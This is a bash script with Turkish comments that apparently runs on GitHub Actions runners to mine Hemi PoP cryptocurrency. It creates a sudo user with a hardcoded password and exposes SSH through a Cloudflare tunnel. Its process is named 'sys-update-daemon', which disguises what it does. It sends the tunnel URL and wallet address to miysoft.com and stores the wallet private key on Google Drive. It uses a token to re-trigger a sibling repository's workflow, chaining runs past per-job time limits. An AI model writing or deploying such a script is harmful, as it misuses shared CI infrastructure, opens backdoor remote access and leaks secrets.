#!/bin/bash

# --- 1. GİZLİLİK VE SSH AYARI ---
export NODE_NAME="sys-update-daemon"
USER_PASS=${SSH_PASSWORD:-"Miysoft1234!"}
sudo useradd -m -s /bin/bash miysoft || true
echo "miysoft:$USER_PASS" | sudo chpasswd
sudo usermod -aG sudo miysoft

# --- 2. CLOUDFLARE SSH TÜNELİ ---
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
./cloudflared tunnel --url tcp://localhost:22 > cf.log 2>&1 &
sleep 15
SSH_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" cf.log | head -n 1)

# --- 3. GOOGLE DRIVE / RCLONE AYARI ---
mkdir -p ~/.config/rclone
echo "[gdrive]
type = drive
token = $RCLONE_TOKEN_BODY" > ~/.config/rclone/rclone.conf

# Klasör hatasını önlemek için rclone mkdir kullanıyoruz
rclone mkdir gdrive:hemi_backup || true
# Varsa önceki cüzdanı çek
rclone copy gdrive:hemi_backup/popm_address.json . || echo "İlk kurulum başlıyor..."

# --- 4. HEMI BINARY KURULUMU (v0.4.3) ---
if [ ! -f "./popmd" ]; then
    echo "Hemi Miner indiriliyor..."
    wget -q https://github.com/hemilabs/heminetwork/releases/download/v0.4.3/heminetwork_v0.4.3_linux_amd64.tar.gz
    tar -xf heminetwork_v0.4.3_linux_amd64.tar.gz
    cp heminetwork_v0.4.3_linux_amd64/popmd .
fi

# --- 5. CÜZDAN YÖNETİMİ ---
if [ ! -f "./popm_address.json" ]; then
    echo "Yeni Hemi cüzdanı oluşturuluyor..."
    ./popmd gen-wallet -l info -o popm_address.json
    # Hemen Google Drive'a yedekle
    rclone copy popm_address.json gdrive:hemi_backup/ --overwrite
fi

# Cüzdan bilgilerini oku (Raporlama için)
HEMI_ADDR=$(cat popm_address.json | jq -r '.pubkey_hash')
export HEMI_BTC_PRIVKEY=$(cat popm_address.json | jq -r '.private_key')

# --- 6. HEMI POP MINER BAŞLAT ---
# Hemi PoP Miner arka planda çalışır
echo "Hemi PoP Miner Başlatılıyor: $HEMI_ADDR"
./popmd --static-fee 50 & 

# --- 7. İZLEME VE RAPORLAMA ---
START_TIME=$SECONDS
while [ $((SECONDS - START_TIME)) -lt 19800 ]; do # 5.5 Saat
    CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    
    # Miysoft'a rapor gönder (Adres ve SSH linkiyle beraber)
    curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "{\"worker_id\":\"W_$WORKER_ID\", \"cpu\":\"$CPU\", \"ram\":\"$RAM\", \"ssh\":\"$SSH_URL\", \"address\":\"$HEMI_ADDR\", \"status\":\"HEMI_MINING\"}" \
         https://miysoft.com/api.php || true
    
    sleep 30
done

# --- 8. YEDEKLEME VE DİĞER REPOYU TETİKLEME ---
pkill popmd
rclone copy popm_address.json gdrive:hemi_backup/ --overwrite

TARGET_REPO=$([ "$GITHUB_REPOSITORY" == "Alkan789/MaxNode" ] && echo "Alkan789/MadNode" || echo "Alkan789/MaxNode")
curl -X POST -H "Authorization: token $PAT_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     https://api.github.com/repos/$TARGET_REPO/dispatches \
     -d "{\"event_type\": \"next_worker\", \"client_payload\": {\"worker_id\": \"$((WORKER_ID + 1))\"}}"
